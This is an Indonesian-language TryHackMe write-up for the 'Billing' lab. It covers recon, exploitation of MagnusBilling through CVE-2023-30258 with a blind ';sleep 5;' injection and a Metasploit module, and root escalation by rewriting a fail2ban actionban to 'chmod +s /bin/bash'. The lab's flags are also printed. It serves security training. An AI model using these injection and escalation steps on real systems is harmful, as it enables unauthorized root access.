# Billing — TryHackMe Writeup

**Target:** Billing  
**Platform:** TryHackMe  
**Difficulty:** Easy
**Kategori:** Web, CVE, Privilege Escalation  

---

## Recon

```
22/tcp    open  ssh    OpenSSH (Debian)
80/tcp    open  http   Apache 2.4.62 (Debian)
3306/tcp  open  mysql  MariaDB (unauthorized)
```

`http-title` menunjukkan **MagnusBilling** — menjadi pegangan awal.

MySQL terbuka namun menolak koneksi tanpa credential, bukan jalur langsung.

---

## Enumerasi Web

Login page ditemukan di `/mbilling`. Hint lab menyatakan brute force out of scope, artinya login bukan attack vector utama.

```bash
gobuster dir -u http://TARGET/mbilling -w common.txt
```

| Path       | Status |
|------------|--------|
| /archive   | 301    |
| /resources | 301    |
| /lib       | 301    |
| /tmp       | 301    |
| /protected | 403    |
| /LICENSE   | 200    |

---

## Identifikasi Versi

Ditemukan file `/README.md` yang mengindikasikan **MagnusBilling v7.x.x**.

---

## Riset Vulnerability

```
CVE-2023-30258
Unauthenticated Command Injection
```

Parameter rentan: `democ`  
File terdampak: `lib/icepay/icepay.php`

Root cause: parameter `democ` diteruskan langsung ke `exec()` tanpa sanitasi, memungkinkan command injection oleh attacker yang tidak terautentikasi.

---

## Eksploitasi

### Verifikasi Blind Injection

```
?democ=;sleep 5;
```

Response delay ±5 detik → confirmed.

### Mendapatkan Shell

```
use linux/http/magnusbilling_unauth_rce_cve_2023_30258
```
dengan memakai script dri https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit
Meterpreter session diperoleh sebagai user `asterisk`.

---

## Post Exploitation

### User Flag

```bash
cd /home/debian
cat user.txt
# THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

---

## Privilege Escalation — Fail2Ban Abuse

### Enumerasi Sudo

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

User `asterisk` dapat menjalankan `fail2ban-client` sebagai root tanpa password.

### Analisis Fail2Ban

```bash
sudo fail2ban-client status
```

Ditemukan beberapa jail aktif, salah satunya `ip-blacklist`.

```bash
sudo fail2ban-client status ip-blacklist
```

Fail2ban mengeksekusi `actionban` command setiap kali ban terjadi. Karena `fail2ban-client` dijalankan via sudo, command yang disisipkan akan berjalan sebagai **root**.

### Inject Payload

Modifikasi `actionban` command pada jail `ip-blacklist`:

```bash
sudo fail2ban-client set ip-blacklist action iptables-allports-ASTERISK actionban "chmod +s /bin/bash"
```

Trigger ban secara manual untuk mengeksekusi payload:

```bash
sudo fail2ban-client set ip-blacklist banip 123.13.32.12
```

Verifikasi SUID terset:

```bash
ls -l /bin/bash
# -rwsr-sr-x 1 root root /bin/bash
```

### Root Shell

```bash
/bin/bash -p
whoami
# root
```

### Root Flag

```bash
cat /root/root.txt
# THM{33ad5b530e71a172648f424ec23fae60}
```

---

## Ringkasan

| Fase           | Teknik                                         |
|----------------|------------------------------------------------|
| Recon          | Nmap, identifikasi http-title                  |
| Enumerasi      | Gobuster, version disclosure via README.md     |
| Vulnerability  | CVE-2023-30258 — Unauth Command Injection      |
| Initial Access | Metasploit RCE → shell sebagai asterisk        |
| PrivEsc        | Fail2Ban `actionban` injection → SUID bash     |
| Flag           | user + root ✅                                 |

## Takeaway

Ketika `sudo -l` menunjukkan binary yang tidak ada di GTFOBins, analisis apa yang binary tersebut *lakukan* daripada menyerah. Fail2ban mengeksekusi `actionban` command sebagai root — setiap jail dengan action yang bisa dimodifikasi menjadi vektor privilege escalation. Insight utama: **action yang bisa diubah + ban yang dipicu = eksekusi command root sembarang**.

